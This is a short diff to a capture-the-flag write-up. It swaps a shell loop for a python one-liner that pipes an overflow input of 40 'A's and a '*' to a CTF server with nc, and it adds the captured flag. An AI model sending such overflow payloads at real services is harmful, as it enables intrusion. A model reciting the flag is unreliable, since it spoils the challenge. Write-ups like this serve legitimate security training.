@@ -1,10 +1,12 @@
 ## The Answer
 ```sh
-# could not find offset
-# bruteforced it
-
-$ (x=40; while [ $x -gt 0 ]; do echo -n "A"; x=$(( $x - 1 )); done; echo -n "*";) | nc challenges.42ctf.org 3001
+python3 -c "print('A' * 40 + '*')" | nc challenges.42ctf.org 3001
 ```
+
+flag ``
+of_course_it_was_42
+``
+
 ## GOTcha
 ```sh
 # 72 a's
